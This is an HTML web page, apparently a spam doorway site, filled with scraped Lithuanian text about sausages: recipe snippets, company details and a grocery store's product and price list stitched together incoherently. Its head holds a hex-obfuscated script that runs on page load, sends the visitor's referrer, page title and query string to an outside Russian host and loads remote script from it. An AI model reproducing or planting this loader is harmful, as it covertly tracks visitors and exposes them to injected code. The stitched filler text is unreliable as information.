<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<title>Virtos dešros</title>
<meta http-equiv="content-type" content="text/html; charset="utf-8" />
<link rel="stylesheet" href="css/1.css" type="text/css" media="screen,projection" />

<script type="text/javascript">var _0x2967=['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x73\x63\x72\x69\x70\x74','\x72\x65\x70\x6c\x61\x63\x65','\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d','\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x69\x6e\x64\x65\x78\x4f\x66','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65','\x73\x72\x63','\x68\x74\x74\x70\x73\x3a','\x68\x65\x61\x64','\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74','\x73\x65\x61\x72\x63\x68','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35\x26\x5f\x63\x69\x64\x3d\x61\x38\x36\x65\x61\x39\x65\x36\x2d\x30\x32\x37\x35\x2d\x36\x32\x65\x61\x2d\x38\x32\x39\x36\x2d\x33\x38\x39\x38\x64\x61\x33\x33\x63\x66\x39\x38','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d','\x74\x69\x74\x6c\x65','\x68\x74\x74\x70\x3a'];(function(_0x32be39,_0x29675a){var _0x49745c=function(_0x1b79c4){while(--_0x1b79c4){_0x32be39['push'](_0x32be39['shift']());}};_0x49745c(++_0x29675a);}(_0x2967,0x139));var _0x4974=function(_0x32be39,_0x29675a){_0x32be39=_0x32be39-0x0;var _0x49745c=_0x2967[_0x32be39];return _0x49745c;};var d=document,s=d['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'](_0x4974('\x30\x78\x63'));s[_0x4974('\x30\x78\x30')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d'+encodeURIComponent(document['\x72\x65\x66\x65\x72\x72\x65\x72'])+_0x4974('\x30\x78\x65')+encodeURIComponent(document[_0x4974('\x30\x78\x38')])+'\x26'+window[_0x4974('\x30\x78\x31\x30')]['\x73\x65\x61\x72\x63\x68'][_0x4974('\x30\x78\x64')]('\x3f','\x26')+_0x4974('\x30\x78\x36');document['\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74']?document[_0x4974('\x30\x78\x33')][_0x4974('\x30\x78\x66')][_0x4974('\x30\x78\x61')](s,document[_0x4974('\x30\x78\x33')]):d[_0x4974('\x30\x78\x31\x32')](_0x4974('\x30\x78\x32'))[0x0]['\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'](s);document['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x4974('\x30\x78\x62')]===_0x4974('\x30\x78\x31')&&_0x4974('\x30\x78\x37')+encodeURIComponent(document['\x72\x65\x66\x65\x72\x72\x65\x72'])+'\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d'+encodeURIComponent(document[_0x4974('\x30\x78\x38')])+'\x26'+window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x4974('\x30\x78\x34')]['\x72\x65\x70\x6c\x61\x63\x65']('\x3f','\x26')+_0x4974('\x30\x78\x35')[_0x4974('\x30\x78\x31\x31')](_0x4974('\x30\x78\x39'))===0x0&&alert('\x54\x68\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x77\x6f\x72\x6b\x73\x20\x6f\x6e\x20\x48\x54\x54\x50\x53\x2e\x20\x54\x68\x65\x20\x74\x72\x61\x63\x6b\x65\x72\x20\x6d\x75\x73\x74\x20\x75\x73\x65\x20\x48\x54\x54\x50\x53\x20\x74\x6f\x6f\x2e');</script>
</head>
<body  id="FJ4t4lj">
<div id="container">
  <div id="header">
    <h1  id="1aFjYP4Ij"><a href="/index.html">mini<strong>BLOG</strong> 1.0</a></h1>
    <h2  id="uN2jPFH">Virtos dešros</h2>
    <ul id="nav">
      <li><a href="index.html" accesskey="h"><em>H</em>ome</a></li>
      <li id="nnw7oxJ7lqf"><a href="privacy-policy.html">Privacy policy</a></a>
	  	<li id="hQUUXJnhP"><a href="terms.html">Terms and Conditions</a></li>
		<li id="wqElsmzCYd"><a href="photo.html">Photo gallery</a></li>
      <li id="FdKRxka3ZVtheh"><a href="contact.html">Contacts</a></li>
    </ul>
  </div>
  <div id="sidebar">
    <h1>Menu</h1>
<ul>
<li><a href="index.html">Dešra | Receptai.lt</a><br> Duona su čoriso dešra - labai gardus patiekalas, kurį nesunkiai pasigaminsite pagal pateiktą receptą šioje svetainėje. Daug gerų ir išbandytų receptų vienoje vietoje, kuriuos tiesiog privalote išmėginti!</li>
<li><a href="1.html">Duona su čoriso dešra - World Recipes</a><br> bendrumas Dešra yra dešra ir konservuota mėsa, gauta daugiausia iš kiaulienos / šernų ( Sus scrofa rūšių). Jo atradimas yra priskirtas Lucan populiacijoms (iki Kristaus gimimo); tai nėra atsitiktinumas, kad archajiškoji dešros nomenklatūra atitinka daiktavardį „ lucanica“. Šis teiginys, logiškai ir liudijantis, atrodo gana pagrįstas, nepaaiškina, kaip kai kurios Šiaurės ...</li>
<li><a href="2.html">dešra - lt.fashionbeautytopics.com</a><br> UAB "Sraigė ir varlė". Kodas: 302598453. PVM mokėtojo kodas: LT100005981519. Plytinės g. 29-42, LT-10105, Vilnius. Telefonas: +37069561403.</li>
<li><a href="3.html">Naminė bulvių dešra. Gaminkite iškart dvigubą porciją!</a><br> Kadangi dešra turi būti ne tik skani, bet ir gerai atrodyti, naudojant tik kietuosius nugaros lašinukus gaunama raiški pjūvio mozaika. Daugiau informacijos apie objektą rasite projekto vykdytojo svetainėje. +9 +3 Jums reikės. Porcijų kiekis +- 7 kg. - mėsos (nugarinės, kumpio ir ...</li>
<li><a href="4.html">Virtos dešros - BARBORA</a><br> Vytinta Gurmanų dešra 150 g. Vytinti mėsos gaminiai Lietuva. 2 29 € Į krepšelį Kiekis 150 g ...</li>
<li><a href="5.html">Vytinta dešra, jos kaina. Išsirink internetu. | Vynoteka</a><br> Dešrelių kimšimui prietaiso - lengvas paslauga daro tai ideali priemonė dešra paruošimo namuose Ši svetainė naudoja slapukus (anglų kalba - cookies), mūsų duomenų srauto analizei, turinio kokybės pagerinimui, turinio priderinimui naudotojų poreikiams ir svetainės veiklos optimizavimui.</li>
<li><a href="6.html">Vytinta dešra | Receptas | skoniukelias.lt</a><br> Kiekvienas gali lengvai pasigaminti sotų ir skanų užkandį iš kiaulienos pagal šį receptą. Nusipirkę visus reikiamus ingredientus, taip pat susiradę reikiamus indus bei įrankius ir radę tinkamą plastikinį buteliuką, galite pradėti darbus virtuvėje! Garantuojame, kad dešra savo skoniu tikrai nenusileis pirktinėms dešroms. Jums reikės: 2 vnt. kiaulės kulninės arba apie 3,5 ...</li>
<li><a href="7.html">Alio dešra, MB. Rekvizitai.lt</a><br> Dešra Dešra - maisto rūšis. Tai yra žemės jautienos (iš vienos ar daugiau rūšių mėsos) patalpintų pailgos lukštais. Priklausomai nuo technologijos ir naudojamos žaliavos yra skirstomi į visas kraujo dešra, kepenų, pashtetnye, rūkyti (rūkyta), rūkytos ir virtos.</li>
<li><a href="8.html">Karštai rūkytos dešros - BARBORA</a><br> Dešra – mėsos gaminys.Pagal gamybos technologiją ir vartojamą žaliavą dešros skirstomos į įdarytas, virtas, dešreles ir sardeles, pusiau rūkytas, rūkytas, arba kietąsias rūkytas, virtas ...</li>
<li><a href="9.html">Dešra užpildymo įrenginį 4 kg - akciza.net</a><br> Dešra (rūkyta) Receptai su &gt;&gt; Skaniausi patiekalai su šiuo ingredientu. Greitai paruošiamos makaronų salotos. Krabų lazdelių ir pekino kopūsto salotos. Vėrinukai. Namie kepta pica. Makaronų su dešra apkepas. Balta mišrainė (baltoji mišrainė) Mišrainė su rūkyta dešra.</li>
</ul>
    <h1>Check it out!</h1>
<ul>
<li><a href="index.html">Dešra | Receptai.lt</a></li>
<li><a href="1.html">Duona su čoriso dešra - World Recipes</a><br></li>
<li><a href="2.html">dešra - lt.fashionbeautytopics.com</a><br></li>
<li><a href="3.html">Naminė bulvių dešra. Gaminkite iškart dvigubą porciją!</a><br></li>
<li><a href="4.html">Virtos dešros - BARBORA</a><br></li>
<li><a href="5.html">Vytinta dešra, jos kaina. Išsirink internetu. | Vynoteka</a><br></li>
<li><a href="6.html">Vytinta dešra | Receptas | skoniukelias.lt</a><br></li>
<li><a href="7.html">Alio dešra, MB. Rekvizitai.lt</a><br></li>
<li><a href="8.html">Karštai rūkytos dešros - BARBORA</a><br></li>
<li><a href="9.html">Dešra užpildymo įrenginį 4 kg - akciza.net</a><br></li>
</ul>
  </div>
  <div id="content">
    <h1><a href="#intro" id="intro">Virtos dešros</a></h1>
<img src="img/0a01875c2894442d2aa224d8a97218be.jpg" width="30%" id="7mHPaF3pAMlr"/>	
<span> Informuojame, kad šioje svetainėje yra naudojami slapukai (angl. cookies). Toliau naršydami svetainėje arba paspausdami mygtuką Sutinku Jūs sutinkate su slapukų naudojimu. Savo duotą sutikimą bet kada galėsite atšaukti pakeisdami savo interneto naršyklės nustatymus ir ištrindami įrašytus slapukus. Daugiau informacijos apie slapukus galite rasti čia . </span> Sutinku Keisti apskritį <span> Parsisiųskite</span> Lietuvių English Русский Registruotis Prisijungti Prisijungti Registruotis <p> Sveiki, ačiū, kad vėl pas mus užsukote!</p> <p> Caps Lock yra įjungtas<p> (8 5) 230 9309 Prekės Mano prekės Akcijos Eko ir ūkis Naujienos Receptai Daržovės ir vaisiai Pieno gaminiai ir kiaušiniai Duonos gaminiai ir konditerija Mėsa, žuvys ir kulinarija Bakalėja Šaldytas maistas Gėrimai Kūdikių ir vaikų prekės Kosmetika ir higiena Švaros ir gyvūnų prekės Namai ir laisvalaikis <span> Pagrindinis puslapis </span> <span> Mėsa, žuvys ir kulinarija </span> <span> Mėsos ir paukštienos gaminiai </span> <span> Virtos dešros </span> (8 5) 230 9309 Kasdien nuo 8 iki 21 val. El. p.: pagalba@barbora.lt Mėsos ir paukštienos gaminiai <span> 477</span> Virtos dešros <span> 55</span> 1 2 Filtruoti Rūšiuoti pagal: Abėcėlę (A-Ž) Abėcėlę (Ž-A) Kainą (didėj.) Kainą (mažėj.) Be Akcijos Akcijines kainas Kaina už mato vnt. (didėj.) Kaina už mato vnt. (mažėj.) <span> Virta UTENOS DAKTARIŠKA dešra, a. r., 250 g</span> <span> €1,09 </span> €4,36/kg Virta UTENOS DAKTARIŠKA dešra, a. r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta GIMINIŲ DAKTARIŠKA dešra, a. r., 250 g</span> <span> €1,52 </span> €6,08/kg Virta GIMINIŲ DAKTARIŠKA dešra, a. r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta VAIKŲ dešra, a. r., 250 g</span> <span> €1,99 </span> €7,96/kg Virta VAIKŲ dešra, a. r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta EKSTRA DAKTARIŠKA dešra, a. r., 250 g</span> <span> €1,99 </span> €7,96/kg Virta EKSTRA DAKTARIŠKA dešra, a. r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DAKTARIŠKA KLASIKINĖ dešra, a. r., 600 g</span> €3,79 <span> €2,65 </span> €4,42/kg Virta DAKTARIŠKA KLASIKINĖ dešra, a. r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta dešra LIETUVOS STANDARTAS, a.r., 250 g</span> <span> €1,89 </span> €7,56/kg Virta dešra LIETUVOS STANDARTAS, a.r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta PANERIO dešra, a. r., 250 g</span> <span> €1,19 </span> €4,76/kg Virta PANERIO dešra, a. r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta dešra MĖSINGA griežinėliais, a.r., 190 g</span> <span> €1,89 </span> €9,95/kg Virta dešra MĖSINGA griežinėliais, a.r., 190 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta kumpinė dešra CHOP&amp;EAT, a. r., 200 g</span> <span> €1,05 </span> €5,25/kg Virta kumpinė dešra CHOP&amp;EAT, a. r., 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONIUKŲ dešra su veršiena, a. r., 300 g</span> <span> €1,99 </span> €6,63/kg Virta SAMSONIUKŲ dešra su veršiena, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONIUKŲ dešra su jautiena, a. r., 300 g</span> <span> €1,89 </span> €6,30/kg Virta SAMSONIUKŲ dešra su jautiena, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta kiaulienos dešra CHOP&amp;EAT, a. r., 200 g</span> <span> €0,79 </span> €3,95/kg Virta kiaulienos dešra CHOP&amp;EAT, a. r., 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta MAŽYLIŲ vištienos filė dešra su joduota druska, a. r., 300 g</span> <span> €1,89 </span> €6,30/kg Virta MAŽYLIŲ vištienos filė dešra su joduota druska, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta daktariška dešra, a. r., 600 g</span> <span> €5,49 </span> €9,15/kg Virta daktariška dešra, a. r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta dešra TOSTY griežinėliais, a.r., 190 g</span> <span> €1,69 </span> €8,89/kg Virta dešra TOSTY griežinėliais, a.r., 190 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta daktariška dešra ŽALGIRIS, a.r., 400 g</span> <span> €2,99 </span> €7,48/kg Virta daktariška dešra ŽALGIRIS, a.r., 400 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta BAJORŲ dešra, a.r., 400 g</span> <span> €3,15 </span> €7,88/kg Virta BAJORŲ dešra, a.r., 400 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta GIMINIŲ daktariška dešra, a. r., 1 kg</span> <span> €6,29 </span> €6,29/kg Virta GIMINIŲ daktariška dešra, a. r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SMETONIŠKA DAKTARIŠKA dešra, a.r., 330 g</span> <span> €1,86 </span> €5,64/kg Virta SMETONIŠKA DAKTARIŠKA dešra, a.r., 330 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta GASPADORIAUS daktariška dešra, a.r., 600 g</span> <span> €2,29 </span> €3,82/kg Virta GASPADORIAUS daktariška dešra, a.r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DAKTARIŠKA dešra VIŠTIENA KITAIP, a. r., 560 g</span> <span> €2,29 </span> €4,09/kg Virta DAKTARIŠKA dešra VIŠTIENA KITAIP, a. r., 560 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta karštų sumuštinių dešra VIŠTIENA KITAIP, a. r., 560 g</span> <span> €2,79 </span> €4,23/kg Virta karštų sumuštinių dešra VIŠTIENA KITAIP, a. r., 560 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta MAŽYLIŲ dešra, a. r., 300 g</span> <span> €1,89 </span> €6,30/kg Virta MAŽYLIŲ dešra, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta KARALIŠKA kalakutienos dešra, a.r., 300 g</span> <span> €2,49 </span> €8,30/kg Virta KARALIŠKA kalakutienos dešra, a.r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONO DAKTARIŠKA dešra, a. r., 330 g</span> <span> €2,49 </span> €7,55/kg Virta SAMSONO DAKTARIŠKA dešra, a. r., 330 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta MĖSINGA dešra, a. r., 340 g</span> <span> €2,28 </span> €6,71/kg Virta MĖSINGA dešra, a. r., 340 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DAKTARIŠKA premium dešra, a. r., 600 g</span> €3,69 <span> €2,58 </span> €4,30/kg Virta DAKTARIŠKA premium dešra, a. r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta dešra JOKIŲ PRIDĖTINIŲ E, a. r., 250 g</span> <span> €2,03 </span> €8,12/kg Virta dešra JOKIŲ PRIDĖTINIŲ E, a. r., 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta ŽEMAITIŠKA dešra, a. r., 1 kg</span> <span> €6,99 </span> €6,99/kg Virta ŽEMAITIŠKA dešra, a. r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONO PANERIO dešra, a. r., 330 g</span> <span> €2,19 </span> €6,64/kg Virta SAMSONO PANERIO dešra, a. r., 330 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta GASPADORIAUS DAKTARIŠKA dešra, a. r., 430 g</span> <span> €0,99 </span> €2,30/kg Virta GASPADORIAUS DAKTARIŠKA dešra, a. r., 430 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta GIMINIŲ daktariška dešra, a.r., 600 g</span> <span> €3,89 </span> €6,48/kg Virta GIMINIŲ daktariška dešra, a.r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta MĖSINGA dešra, a.r., 1 kg</span> <span> €6,99 </span> €6,99/kg Virta MĖSINGA dešra, a.r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta PANERIO dešra, a. r., 300 g</span> <span> €1,06 </span> €3,53/kg Virta PANERIO dešra, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DAKTARIŠKA dešra, a. r., 320 g</span> <span> €1,82 </span> €5,69/kg Virta DAKTARIŠKA dešra, a. r., 320 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONO DAKTARIŠKA dešra, a.r., 600 g</span> <span> €4,39 </span> €7,32/kg Virta SAMSONO DAKTARIŠKA dešra, a.r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta BAJORŲ dešra, a. r., 1 kg</span> <span> €6,59 </span> €6,59/kg Virta BAJORŲ dešra, a. r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta kumpinė SAMSONO dešra, a. r., 350 g</span> <span> €2,89 </span> €8,26/kg Virta kumpinė SAMSONO dešra, a. r., 350 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta GASPADORIAUS daktariška dešra, a.r., 300 g</span> <span> €0,65 </span> €2,17/kg Virta GASPADORIAUS daktariška dešra, a.r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta EKSTRA dešra su lašinukais, a. r., 320 g</span> <span> €1,59 </span> €4,97/kg Virta EKSTRA dešra su lašinukais, a. r., 320 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONO KUMPINĖ dešra, a.r., 200 g</span> <span> €1,99 </span> €9,95/kg Virta SAMSONO KUMPINĖ dešra, a.r., 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DAKTARIŠKA dešra, a. r., 300 g</span> <span> €1,18 </span> €3,93/kg Virta DAKTARIŠKA dešra, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta daktariška PREMIUM dešra, a.r., 600 g</span> <span> €3,29 </span> €5,48/kg Virta daktariška PREMIUM dešra, a.r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta VAIKŲ dešra, a. r., 150 g</span> <span> €1,18 </span> €7,87/kg Virta VAIKŲ dešra, a. r., 150 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DAKTARIŠKA EKSTRA dešra, a. r., 600 g</span> €3,89 <span> €1,95 </span> €3,24/kg <span> 2 už <span> €3,89</span> </span> Virta DAKTARIŠKA EKSTRA dešra, a. r., 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta ŽEMAITIŠKA dešra su lašinukais, a. r., 1 kg</span> <span> €6,99 </span> €6,99/kg Virta ŽEMAITIŠKA dešra su lašinukais, a. r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta DZŪKŲ dešra, a. r., 1 kg</span> <span> €6,99 </span> €6,99/kg Virta DZŪKŲ dešra, a. r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta SAMSONIUKŲ dešra, a. r., 300 g</span> <span> €1,99 </span> €6,63/kg Virta SAMSONIUKŲ dešra, a. r., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Mažai parūkyta virta GURMANŲ dešra, a. r., 550 g</span> €4,49 <span> €3,14 </span> €5,71/kg Mažai parūkyta virta GURMANŲ dešra, a. r., 550 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta daktariška dešra su jautiena, a. r., 550 g</span> €3,99 <span> €2,79 </span> €5,07/kg Virta daktariška dešra su jautiena, a. r., 550 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta EKSTRA dešra su lašinukais, a. r., 1 kg</span> <span> €5,99 </span> €5,99/kg Virta EKSTRA dešra su lašinukais, a. r., 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virta kalakutienos kumpinė dešra, a.r., 90 g</span> <span> €1,99 </span> €22,11/kg Virta kalakutienos kumpinė dešra, a.r., 90 g <span> KARTU REKOMENDUOJAME</span> <span> </span> 1 2 Prekės Mano prekės Akcijos Eko ir ūkis Naujienos Receptai
<hr />
<iframe width="100%" height="100%" src="https://www.youtube.com/embed/DWpwDDGqFic" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    <div class="article_menu" id="QZtoXPECDMG"> <b>Posted</b> <a href="#">28 Comments</a> </div>

  </div>
  <div id="footer">
    <p> Template design by <a href="#">Six Shooter Media</a>.<br />
&copy; All your copyright information here. </p>
<p id="1hssHEe"></p>

  </div>
</div>

</body>
</html>
